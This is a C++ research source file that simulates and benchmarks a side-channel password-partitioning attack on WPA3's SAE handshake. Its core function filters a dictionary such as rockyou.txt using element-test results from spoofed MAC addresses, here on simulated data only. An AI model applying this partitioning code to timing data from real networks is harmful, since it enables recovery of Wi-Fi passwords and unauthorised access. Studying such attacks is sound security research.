// Possible optimizations:
// - First determine which passwords less than X loops. These can then be quickly dropped.
// - Or first determine which passwords require more than X loops, so they can then be dropped?
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <getopt.h>

#include <openssl/bn.h>
#include <openssl/sha.h>

#include <list>
#include <string>
#include <algorithm>
#include <vector>
#include <set>

#include "crypto.h"
#include "sae.h"
#include "simulate.h"

const char *FILE_ROCKYOU = "/home/mathy/infosec/rockyou.txt";

void read_passwords(const char *filename, std::list<std::string> &passwords)
{
	FILE *fp = fopen(filename, "r");
	char line[256];

	while (fgets(line, sizeof(line), fp) != NULL)
		passwords.push_front(std::string(line));

	printf("Read %d passwords from %s\n", passwords.size(), filename);

	fclose(fp);
}


// ========================================== Micro Benchmarks ==========================================

void next_password(uint8_t password[16])
{
	int index = 15;
	while (index >= 0 && ++password[index] == 0)
		index -= 1;
}

void benchmark_micro_ffc(int group_id)
{
	uint8_t password[16];
	uint8_t addr1[6], addr2[6];
	const struct dh_group *dh = get_dh_group(group_id);

	for (int i = 0; i < 400000; ++i)
	{
		next_password(password);

		// Execute a single quadratic residue test
		sae_num_elemtests_ffc_iteration(dh, addr1, addr2, password, sizeof(password), 1);
	}
}


void benchmark_micro_ecc(int group_id = 19)
{
	uint8_t password[16];
	uint8_t addr1[6], addr2[6];
	const struct ec_group *ec = get_ec_group(group_id);
	uint8_t pwd_seed[SHA256_DIGEST_LENGTH];

	for (int i = 0; i < 1000000; ++i)
	{
		next_password(password);

		// Execute a single quadratic residue test
		sae_num_elemtests_ecc_iteration(ec, addr1, addr2, password, sizeof(password), pwd_seed, 1);
	}
}

void benchmark_micro(int group_id)
{

	struct timespec start, stop;
	unsigned long long accum;

	if (clock_gettime(CLOCK_REALTIME, &start) == -1) {
		perror("clock gettime");
		exit(1);
	}

	if (group_id >= 22 && group_id <= 24)
		benchmark_micro_ffc(group_id);
	else
		benchmark_micro_ecc(group_id);

	if (clock_gettime(CLOCK_REALTIME, &stop) == -1) {
		perror("clock gettime");
		exit(1);
	}

	accum = (stop.tv_sec - start.tv_sec) * 1000000000
		+ (stop.tv_nsec - start.tv_nsec);
	printf("%lld nanoseconds\n", accum);
}


// ========================================== Partitioning attack code ==========================================


/**
 * The partitioning algorithm for ECC and FCC element tests.
 *
 * @param data : result of the element tests
 * @param password: lif of the password to be tested. This listed is filtered by the partitioning algorithm.
 * @param pws_to_remain: run the partioning algorithm until less (or equal) than this number of password remain in the password list
 * @param out_total_used_tests: if not NULL, this argument contains the totel number of simulated element tests.
 * @param out_used_macaddrs: if not NULL, this argument contains the totel number of used spoofed MAC addresses.
 * @returns: the number of used element tests. This is different from the total number of used timings measurements,
 *           because one timing measurement can contain multiple element test results.
 *
 * Note: in the future, this function may be merged with the ECC version.
 */
int partition_attack(IterationData data, std::list<std::string> &passwords, int pws_to_remain = 1, int *out_total_used_tests = NULL, int *out_used_macaddrs = NULL)
{
	uint8_t pwd_seed[SHA256_DIGEST_LENGTH];
	std::set<std::string> used_macaddrs;
	int total_element_tests = 0;
	int total_used_tests = 0;

	for (std::list<IterationResult>::iterator it = data.iterations.begin(); passwords.size() > pws_to_remain && it != data.iterations.end(); ++it)
	{
		unsigned char *macaddr = it->macaddr;

		for (std::list<std::string>::iterator pw_it = passwords.begin(); pw_it != passwords.end(); )
		{
			// Inspect te group we're using, and simulate the result of the password
			bool found;
			if (data.group_id >= 22 && data.group_id <= 24) {
				const struct dh_group *dh = get_dh_group(data.group_id);
				found = sae_num_elemtests_ffc_iteration(dh, data.bssid,
				   	macaddr, (uint8_t*)pw_it->c_str(),
				   	pw_it->length(), it->iteration);
			} else {
				const struct ec_group *ec = get_ec_group(data.group_id);
				found = sae_num_elemtests_ecc_iteration(ec, data.bssid,
				   	macaddr, (uint8_t*)pw_it->c_str(),
				   	pw_it->length(), pwd_seed, it->iteration);
			}

			// Keep track of total executed quadratic residue tests
			total_element_tests++;

			// Filter the password if possible
			if (found != it->found)
				pw_it = passwords.erase(pw_it);
			else
				pw_it = ++pw_it;
		}

		total_used_tests++;
		used_macaddrs.insert(std::string((char *)macaddr, 6));
	}

	if (out_total_used_tests)
		*out_total_used_tests += total_used_tests;

	if (out_used_macaddrs)
		*out_used_macaddrs = used_macaddrs.size();

	return total_element_tests;
}


// ========================================== Main simulation function ==========================================

#define NUM_SIMULATION_TESTS 100

class SimulationResults
{
public:
	/** Total number of performed simulations */
	int simulations;

	/** Index is the number of used element tests, and the value how many times this occurred */
	std::vector<int> used_elemtests;

	/** Index is the number of used element tests, and the value the number of simulated element tests */
	std::vector<int> simulated_elemtests;

	/** The number of used timing measurements over all simulations performed so far. Only valid for MODP groups. */
	int used_timing_measurements;

public:
	SimulationResults(int max_elemtests) : simulations(0), used_elemtests(max_elemtests),
		simulated_elemtests(max_elemtests), used_timing_measurements(0)
	{
		/* nothing */
	}

	static void write_vector(FILE *fp, const char *name, const std::vector<int> &list)
	{
		fprintf(fp, "%s = [", name);
		for (int i = 0; i < list.size() - 1; ++i)
			fprintf(fp, "%d, ", list[i]);
		fprintf(fp, "%d]\n", list[list.size() - 1]);
	}

	static void print_vector(const char *varname, const std::vector<int> &list)
	{
		int start_idx = 0;
		while (start_idx < list.size() && list[start_idx] == 0)
			start_idx++;

		int end_idx = list.size() - 1;
		while (end_idx >= 0 && list[end_idx] == 0)
			end_idx--;

		for (int i = start_idx; i <= end_idx; ++i)
			printf("%s[%02d] = %d\n", varname, i, list[i]);
	}

	int write_to_file(const char *filename) const
	{
		FILE *fp = fopen(filename, "w");
		if (fp == NULL) {
			fprintf(stderr, "Failed to open file %s: ", filename);
			perror("");
			return -1;
		}

		fprintf(fp, "simulations = %d\n", this->simulations);
		write_vector(fp, "used_elemtests", this->used_elemtests);
		write_vector(fp, "simulated_elemtests", this->simulated_elemtests);
		fprintf(fp, "used_timing_measurements = %d\n", this->used_timing_measurements);

		fclose(fp);
		return 0;
	}

	void print() const
	{
		printf("---\n");

		print_vector("used_elemtests", this->used_elemtests);
		print_vector("simulated_elemtests", this->simulated_elemtests);

		int total_used_elemtests = 0;
		for (int i = 0; i < this->used_elemtests.size(); ++i)
			total_used_elemtests += i * this->used_elemtests[i];
		printf("Average used element tests: %lf (%d/%d)\n",
			(double)total_used_elemtests / this->simulations,
			total_used_elemtests, this->simulations);

		int total_simulated_elemtests = 0;
		for (int i = 0; i < this->used_elemtests.size(); ++i)
			total_simulated_elemtests += this->simulated_elemtests[i];
		printf("Average simulated element tests: %lf (%d/%d)\n",
			(double)total_simulated_elemtests / this->simulations,
			total_simulated_elemtests, this->simulations);

		if (this->used_timing_measurements > 0) {
			printf("Average used timing measurements: %lf (%d/%d)\n",
				(double)this->used_timing_measurements / this->simulations,
				this->used_timing_measurements, this->simulations);
		}
	}
};

SimulationResults simulate_partition_attack(const char *outfile, std::list<std::string> &passwords, int group_id = 22)
{
	const char *real_password = "wpa3-password";
	SimulationResults results(NUM_SIMULATION_TESTS);

	passwords.push_front(std::string(real_password));

	// Track time to decide when to print and write to file
	time_t prev_write_time = time(NULL);
	time_t prev_print_time = time(NULL);

	// Wait for the user to stop
	while (true)
	{
		IterationData iteration_data;
		std::list<std::string> passwords_copy = passwords;

		simulate_online_attack(group_id, real_password, NUM_SIMULATION_TESTS, iteration_data);

		int used_tests = 0, used_timings = 0;
		int simulated_tests = partition_attack(iteration_data, passwords_copy, 1, &used_tests, &used_timings);

		if (passwords_copy.size() != 1) {
			fprintf(stderr, "%s: ERROR: Password wasn't found\n", __FUNCTION__);
			exit(1);
		}

		results.simulations++;
		results.used_elemtests[used_tests]++;
		results.simulated_elemtests[used_tests] += simulated_tests;
		results.used_timing_measurements += used_timings;

		time_t curr_time = time(NULL);
		if (curr_time > prev_print_time + 5) {
			results.print();
			prev_print_time = curr_time;
		}
		if (curr_time > prev_write_time + 30) {
			results.write_to_file(outfile);
			prev_write_time = curr_time;
			printf("====[ WRITE TO FILE ]====\n");
		}

	}

	return results;
}


/**
 * TODO: Improve how this function can be called from the command line.
 */
SimulationResults simulate_partition_attack_smart(const char *outfile, std::list<std::string> &passwords, int group_id = 22)
{
	const char *real_password = "wpa3-password";
	SimulationResults results(NUM_SIMULATION_TESTS);

	passwords.push_front(std::string(real_password));

	// Track time to decide when to print and write to file
	time_t prev_write_time = time(NULL);
	time_t prev_print_time = time(NULL);

	// Wait for the user to stop
	while (true)
	{
		// TODO: Specify the start and end arguments as a parameter?
		for (int elemtests = 10; elemtests < 20; elemtests++)
		{
			IterationData iteration_data;
			std::list<std::string> passwords_copy = passwords;

			simulate_online_attack(group_id, real_password, elemtests, iteration_data);

			iteration_data.sort_results();

			int used_tests = 0;
			int simulated_tests = partition_attack(iteration_data, passwords_copy, 1, &used_tests);

			if (passwords_copy.size() == 1) {
				results.used_elemtests[used_tests]++;
				results.simulated_elemtests[used_tests] += simulated_tests;
			}

			results.simulations++;

			time_t curr_time = time(NULL);
			if (curr_time > prev_print_time + 5) {
				results.print();
				prev_print_time = curr_time;
			}
			if (curr_time > prev_write_time + 30) {
				results.write_to_file(outfile);
				prev_write_time = curr_time;
				printf("====[ WRITE TO FILE ]====\n");
			}
		}
	}

	return results;
}

// ========================================== Main function ==========================================

struct options {
	int group_id;
	int micro;
	int smart;
	const char *dictionary_file;
	int dictionary_size;
} opt;

int main(int argc, char *argv[])
{
	if (test_ecc() < 0)
		exit(1);

	int c;

	while (1)
	{
		static struct option long_options[] =
		{
			{"micro", no_argument, 0, 'm'},
			{"smart", no_argument, 0, 's'},
			{"group", required_argument, 0, 'g'},
			{"dictionary", required_argument, 0, 'f'},
			{"dictionary-size", required_argument, 0, 'd'},
			{0, 0, 0, 0}
		};
		/* getopt_long stores the option index here. */
		int option_index = 0;

		c = getopt_long(argc, argv, "msf:d:g:", long_options, &option_index);

		/* Detect the end of the options. */
		if (c == -1)
			break;

		switch (c)
		{
		case 'm':
			opt.micro = 1;
			break;

		case 's':
			opt.smart = 1;
			break;

		case 'f':
			opt.dictionary_file = optarg;
			break;

		case 'd':
			opt.dictionary_size = atoi(optarg);
			break;

		case 'g':
			opt.group_id = atoi(optarg);
			break;

		default:
			abort();
		}
	}

	// Check conflicting arguments
	if (opt.micro && opt.smart) {
		printf("Cannot use --micro and --smart flags at the same time\n");
		return 1;
	} else if (opt.dictionary_file != NULL && opt.dictionary_size > 0) {
		printf("Cannot use --dictionary and --dictionary-size at the same time\n");
		return 1;
	}

	// Set default arguments
	if (opt.group_id == 0)
		opt.group_id = 19;
	if (opt.dictionary_file == NULL && opt.dictionary_size == 0)
		opt.dictionary_size = 1000;

	if (opt.micro)
	{
		benchmark_micro(opt.group_id);
	}
	else
	{
		// Based on the options, load/generate a dictionary of passwords
		std::list<std::string> passwords;
		int group_id = 22;
		char outfile[256];

		if (opt.dictionary_file)
			read_passwords(opt.dictionary_file, passwords);
		else
			simulate_dictionary(opt.dictionary_size, passwords);

		printf("Simulating group %d\n", opt.group_id);
		printf("Using a dictionary of size %d\n", passwords.size());
		sprintf(outfile, "simulation_results_%d.py", time(NULL));
		SimulationResults results = simulate_partition_attack(outfile, passwords, opt.group_id);
	}

	return 0;
}

